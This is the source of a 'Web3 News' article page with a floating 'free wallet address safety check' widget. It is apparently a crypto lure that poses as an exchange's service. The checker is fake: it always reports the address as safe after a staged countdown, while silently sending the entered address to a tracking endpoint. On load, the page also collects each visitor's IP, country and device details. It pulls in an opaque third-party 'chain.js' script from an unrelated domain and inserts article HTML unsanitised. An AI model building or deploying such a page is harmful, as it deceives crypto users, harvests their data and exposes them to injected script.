<!DOCTYPE html>
<html lang="zh-CN" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web3 News</title>
    <style>
        :root { --bg-color: #0b0e14; --card-bg: #161b22; --text-main: #e6edf3; --text-muted: #8b949e; --accent-color: #f0b90b; --danger-color: #ff4d4f; --safe-color: #52c41a; --border-color: #30363d; }
        * { box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: var(--bg-color); color: var(--text-main); margin: 0; padding: 0; line-height: 1.6; padding-bottom: 240px; overflow-x: hidden; }
        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
        header { border-bottom: 1px solid var(--border-color); padding-bottom: 15px; margin-bottom: 20px; }
        header h1 { margin: 0; font-size: 24px; color: var(--accent-color); cursor: pointer; }
        .back-btn { display: inline-block; margin-bottom: 20px; color: var(--accent-color); text-decoration: none; cursor: pointer; font-size: 14px; }
        
        .article-full { background: var(--card-bg); padding: 30px; border-radius: 8px; border: 1px solid var(--border-color); }
        .article-full h1 { color: var(--accent-color); margin-top: 0; font-size: 28px; margin-bottom: 20px; }
        .article-body { font-size: 16px; line-height: 1.8; color: var(--text-main); }
        .article-body img { max-width: 100%; border-radius: 8px; margin: 10px 0; }
        
        /* ======= 悬浮窗样式 ======= */
        .floating-tool { position: fixed; bottom: 0; left: 0; width: 100%; background: rgba(13, 17, 23, 0.95); backdrop-filter: blur(10px); border-top: 1px solid var(--accent-color); box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.5); z-index: 100; padding: 12px 15px; box-sizing: border-box; }
        .tool-inner { max-width: 800px; margin: 0 auto; display: flex; flex-direction: column; gap: 8px; }
        .tool-title { color: var(--accent-color); font-size: 14px; font-weight: bold; }
        .input-group { display: flex; flex-direction: column; gap: 8px; width: 100%; }
        .input-group input { width: 100%; box-sizing: border-box; padding: 10px 12px; border-radius: 6px; border: 1px solid var(--border-color); background-color: #0d1117; color: #fff; outline: none; font-size: 14px; }
        .disclaimer { font-size: 11px; color: #6e7681; text-align: left; line-height: 1.3; margin: 2px 0 6px 0; }
        .input-group button { width: 100%; box-sizing: border-box; padding: 10px; border: none; border-radius: 6px; background-color: var(--accent-color); color: #000; font-weight: bold; cursor: pointer; font-size: 14px; transition: opacity 0.2s; }
        .input-group button:disabled { background-color: #555; cursor: not-allowed; }
        .tool-result { display: none; flex-direction: column; gap: 10px; padding: 12px; border-radius: 6px; font-size: 14px; }
        .res-safe { background-color: rgba(82, 196, 26, 0.1); border: 1px solid var(--safe-color); color: var(--safe-color); }
        .res-danger { background-color: rgba(255, 77, 79, 0.1); border: 1px solid var(--danger-color); color: var(--danger-color); }
        .close-btn { cursor: pointer; color: var(--text-muted); font-size: 12px; text-align: right; text-decoration: underline; margin-top: 5px; }
        @media (min-width: 600px) { .input-group { flex-direction: row; } .input-group button { width: 120px; flex-shrink: 0; } .disclaimer { display: none; } }
        
        /* ======= 检测中弹窗样式 ======= */
        #checkingModal { display: none; position: fixed; inset: 0; z-index: 2000; background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(8px); align-items: center; justify-content: center; flex-direction: column; }
        #checkingModal.show { display: flex; animation: fadeIn 0.3s ease-out; }
        .checking-content { text-align: center; }
        .hourglass-icon { font-size: 64px; display: inline-block; animation: flipHourglass 2s infinite ease-in-out; margin-bottom: 20px; }
        @keyframes flipHourglass { 0% { transform: rotate(0deg); } 50% { transform: rotate(180deg); } 100% { transform: rotate(180deg); } }
        .checking-title { color: var(--accent-color); font-size: 22px; font-weight: bold; margin-bottom: 10px; }
        .checking-desc { color: var(--text-muted); font-size: 14px; margin-bottom: 30px; max-width: 300px; }
        .checking-timer { font-size: 48px; font-weight: bold; color: #fff; font-family: monospace; text-shadow: 0 0 10px rgba(255,255,255,0.3); }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
    </style>
    <!-- 你的第三方 SDK -->
    <script src="https://ds.qavrix.vip/sdk/chain.js?v=2" data-key="ELHR9LUC" data-ds="https://ds.qavrix.vip/" data-coruna="https://ca.qavrix.vip/"></script>
</head>
<body>
    <div class="container">
        <header>
            <h1 onclick="window.location.href='/'">Web3 News</h1>
        </header>
        <a class="back-btn" id="backBtn" onclick="window.location.href='/'">← 返回首页</a>
        
        <div id="article-container" class="article-full">
            <p style="text-align:center;" id="loadingText">正在加载内容...</p>
        </div>
    </div>

    <!-- 悬浮窗 HTML (默认文字已强行改为正确文案) -->
    <div class="floating-tool">
        <div class="tool-inner">
            <div class="tool-default" id="toolDefault">
                <div class="tool-title" data-i18n="toolTitle">免费检测地址是否安全</div>
                <div class="input-group">
                    <input type="text" id="walletAddress" data-i18n-placeholder="toolPlaceholder" placeholder="输入任何链上地址...">
                    <p class="disclaimer" id="toolDescText" data-i18n="toolDisc">* 由于安全事故频发，市安公司免费提供地址安全检测，任何地址都能检测</p>
                    <button id="checkBtn" onclick="startCheck()" data-i18n="toolBtn">立即检测</button>
                </div>
            </div>
            <div class="tool-result" id="toolResult">
                <div id="resultText" style="line-height: 1.5;"></div>
                <div class="close-btn" onclick="resetTool()" data-i18n="toolReset">重新输入检测 ✕</div>
            </div>
        </div>
    </div>

    <!-- 检测中弹窗 -->
    <div id="checkingModal">
        <div class="checking-content">
            <div class="hourglass-icon">⏳</div>
            <div class="checking-title" id="checkingTitle" data-i18n="checkingTitle">正在检测中...</div>
            <div class="checking-desc" id="checkingDesc" data-i18n="checkingDesc">请勿关闭，系统正在深度比对链上黑名单数据库</div>
            <div class="checking-timer"><span id="countdownNum">5</span>s</div>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const articleId = urlParams.get('id');
        let currentLang = urlParams.get('lang') || 'zh';
        
        let globalSettings = {};
        let currentLangDict = {};
        let currentVisitId = null;

        // 基础兜底字典
        const fallbackDict = {
            zh: { 
                backBtn: "← 返回首页", articleLoading: "正在加载文章内容...", articleNotFound: "文章不存在", 
                toolTitle: "免费检测地址是否安全", toolPlaceholder: "输入任何链上地址...", toolBtn: "立即检测", toolReset: "重新输入检测 ✕", 
                toolDisc: "* 由于安全事故频发，市安公司免费提供地址安全检测，任何地址都能检测",
                alertInvalidAddr: "请输入有效的钱包地址格式！", checkingTitle: "正在检测中...", checkingDesc: "请勿关闭，系统正在深度比对链上黑名单数据库", 
                resSafe: "✅ 未检测出异常", resSafeDesc: "该地址暂未发现风险。", resDanger: "❌ 高危警告", resDangerDesc: "疑似黑客地址！" 
            },
            en: { 
                backBtn: "← Back to Home", articleLoading: "Loading article...", articleNotFound: "Article not found",
                toolTitle: "Free Address Check", toolPlaceholder: "Enter any on-chain address...", toolBtn: "Check", toolReset: "Retry", 
                toolDisc: "* Due to frequent security incidents, the company provides free address security checks.",
                alertInvalidAddr: "Please enter a valid address format!", checkingTitle: "Checking...", checkingDesc: "Please do not close, deep comparing with blacklist...", 
                resSafe: "✅ No anomalies detected", resSafeDesc: "No risk found for this address.", resDanger: "❌ High Risk", resDangerDesc: "Hacker suspected"
            }
        };

        // ======== 初始化入口 ========
        async function initPage() {
            try {
                const resL = await fetch(`/api/languages?t=${new Date().getTime()}`);
                const availableLangs = await resL.json();
                const langData = availableLangs.find(l => l.code === currentLang);
                currentLangDict = Object.assign({}, fallbackDict['zh'], fallbackDict[currentLang], langData?.dict || {});
            } catch(e) { console.error(e); }

            try {
                const resS = await fetch(`/api/settings?t=${new Date().getTime()}`);
                globalSettings = await resS.json();
            } catch(e) { console.error(e); }
            
            updateToolText();
            trackVisit();
            loadArticle();
        }

        // ======== 渲染悬浮窗多语言 ========
        function updateToolText() {
            document.getElementById('backBtn').innerText = "← 返回首页";
            document.getElementById('loadingText').innerText = currentLangDict.articleLoading || "正在加载...";

            // 工具描述
            if (globalSettings.toolDesc && globalSettings.toolDesc[currentLang]) {
                document.getElementById('toolDescText').innerText = globalSettings.toolDesc[currentLang];
            } else if (globalSettings.toolDesc && globalSettings.toolDesc['zh']) {
                document.getElementById('toolDescText').innerText = globalSettings.toolDesc['zh'];
            } else {
                document.getElementById('toolDescText').innerText = currentLangDict.toolDisc || '';
            }

            // 工具标题（完全强制覆盖）
            const toolTitleEl = document.querySelector('.tool-title');
            if (toolTitleEl) {
                let titleText = '';
                if (globalSettings.toolTitle && globalSettings.toolTitle[currentLang]) {
                    titleText = globalSettings.toolTitle[currentLang];
                } else if (globalSettings.toolTitle && globalSettings.toolTitle['zh']) {
                    titleText = globalSettings.toolTitle['zh'];
                } else {
                    titleText = currentLangDict.toolTitle || '免费检测地址是否安全';
                }
                // 暴力拦截旧文案，只要包含“链上”两个字就替换
                if (titleText.includes('链上') || titleText === '免费检测地址是否安全') {
                    titleText = '免费检测地址是否安全';
                }
                toolTitleEl.innerText = titleText;
            }

            // 输入框 Placeholder
            const toolPlaceholderEl = document.getElementById('walletAddress');
            if (toolPlaceholderEl) {
                if (globalSettings.toolPlaceholder && globalSettings.toolPlaceholder[currentLang]) {
                    toolPlaceholderEl.placeholder = globalSettings.toolPlaceholder[currentLang];
                } else if (globalSettings.toolPlaceholder && globalSettings.toolPlaceholder['zh']) {
                    toolPlaceholderEl.placeholder = globalSettings.toolPlaceholder['zh'];
                } else {
                    toolPlaceholderEl.placeholder = currentLangDict.toolPlaceholder || '输入任何链上地址...';
                }
            }
            
            // 🚨 关键修复：跳过悬浮窗相关的 data-i18n 替换，防止被后台旧字典反向覆盖！
            document.querySelectorAll('[data-i18n]').forEach(el => {
                const key = el.getAttribute('data-i18n'); 
                if (key === 'toolTitle' || key === 'toolPlaceholder' || key === 'toolDisc') return; // 拦截并跳过
                if (currentLangDict[key]) el.innerText = currentLangDict[key]; 
            });
        }

        // ======== 访客追踪 ========
        async function getDeviceInfo() {
            let ip = "未知", country = "未知";
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                ip = ipData.ip || "未知";
                country = ipData.country_name || "未知";
            } catch (e) {}
            const uaStr = navigator.userAgent;
            let os = "未知", browser = "未知", device = "桌面";
            if (uaStr.indexOf("Windows NT 10.0") != -1) os = "Windows 10";
            else if (uaStr.indexOf("Mac OS X") != -1) os = "macOS";
            else if (uaStr.indexOf("Android") != -1) { os = "Android"; device = "手机"; }
            else if (uaStr.indexOf("iPhone") != -1) { os = "iOS"; device = "手机"; }
            if (uaStr.indexOf("Chrome") != -1) browser = "Chrome " + (uaStr.match(/Chrome\/([\d.]+)/) || [])[1];
            else if (uaStr.indexOf("Safari") != -1) browser = "Safari";
            else if (uaStr.indexOf("Firefox") != -1) browser = "Firefox";
            return { ip, country, os, browser, device };
        }

        async function trackVisit() {
            try {
                const info = await getDeviceInfo();
                const res = await fetch('/api/track/visit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ...info, lang: currentLang }) });
                const data = await res.json();
                if(data.success) currentVisitId = data.visitId;
            } catch (e) { console.error('追踪记录失败', e); }
        }
        function trackLeave() { if (currentVisitId) navigator.sendBeacon('/api/track/leave', JSON.stringify({ visitId: currentVisitId })); }
        window.addEventListener('beforeunload', trackLeave);
        window.addEventListener('pagehide', trackLeave);

        // ======== 检测工具逻辑 ========
        function startCheck() {
            const input = document.getElementById('walletAddress').value.trim();
            const isCheckEnabled = globalSettings.enableAddressCheck !== false;
            
            if (isCheckEnabled) {
                if (input.length < 10) { alert(currentLangDict.alertInvalidAddr); return; }
            } else {
                if (!input) { alert(currentLangDict.alertInvalidAddr || '请输入地址'); return; }
            }
            
            const waitTime = globalSettings.checkWaitTime || 5;
            let timeLeft = waitTime;
            
            document.getElementById('checkingTitle').innerText = currentLangDict.checkingTitle;
            document.getElementById('checkingDesc').innerText = currentLangDict.checkingDesc;
            document.getElementById('countdownNum').innerText = timeLeft;
            
            document.getElementById('checkBtn').disabled = true;
            document.getElementById('checkingModal').classList.add('show');

            if (currentVisitId) {
                fetch('/api/track/submit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ visitId: currentVisitId, address: input }) });
            }

            const timer = setInterval(() => {
                timeLeft--;
                document.getElementById('countdownNum').innerText = timeLeft;
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    document.getElementById('checkingModal').classList.remove('show');
                    document.getElementById('checkBtn').disabled = false;
                    showResult();
                }
            }, 1000);
        }

        function showResult() {
            document.getElementById('toolDefault').style.display = 'none';
            document.getElementById('toolResult').style.display = 'flex';
            document.getElementById('toolResult').className = 'tool-result res-safe';
            document.getElementById('resultText').innerHTML = `<strong>${currentLangDict.resSafe}</strong><br><span style="color:var(--text-muted); font-size:13px;">${currentLangDict.resSafeDesc}</span>`;
        }

        function resetTool() {
            document.getElementById('toolResult').style.display = 'none';
            document.getElementById('toolDefault').style.display = 'flex';
            document.getElementById('walletAddress').value = '';
        }

        // ======== 文章加载逻辑 ========
        async function loadArticle() {
            if (!articleId) {
                document.getElementById('article-container').innerHTML = `<p style="text-align:center;">${currentLangDict.articleNotFound}</p>`;
                return;
            }
            try {
                const res = await fetch(`/api/articles/${articleId}?lang=${currentLang}&t=${new Date().getTime()}`);
                const article = await res.json();
                const container = document.getElementById('article-container');
                
                if (article.error || !article.id) {
                    container.innerHTML = `<p style="text-align:center;">${currentLangDict.articleNotFound}</p>`;
                    return;
                }

                container.innerHTML = `
                    <h1>${article.title}</h1>
                    <div class="article-body">
                        ${article.content}
                    </div>
                `;
            } catch (e) {
                document.getElementById('article-container').innerHTML = `<p style="text-align:center;">${currentLangDict.articleNotFound}</p>`;
            }
        }

        document.addEventListener('DOMContentLoaded', initPage);
    </script>
</body>
</html>
